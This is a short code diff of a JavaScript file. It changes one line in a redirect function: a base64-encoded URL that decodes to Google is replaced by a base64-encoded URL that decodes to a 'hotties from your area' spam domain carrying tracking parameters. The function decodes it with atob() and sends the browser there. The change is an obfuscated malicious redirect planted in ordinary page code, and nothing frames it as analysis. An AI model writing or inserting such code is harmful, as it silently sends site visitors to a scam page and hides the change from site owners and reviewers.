@@ -65,7 +65,7 @@ $(document).ready(function () {
 
 function redirectToUrl() {
 
-    var encodedUrl = 'aHR0cHM6Ly9nb29nbGUuY29t';
+    var encodedUrl = 'aHR0cHM6Ly9iZXNyaG90dGllcy1mcm9tLXlvdXItYXJlYS5saWZlLz91PXZ1ZDhrd2smbz1ka2drYjQxJm09MSZ0PXByZWxhbmRfaW5zdGE=';
     var decodedUrl = atob(encodedUrl);
     window.location.href = decodedUrl;
 }
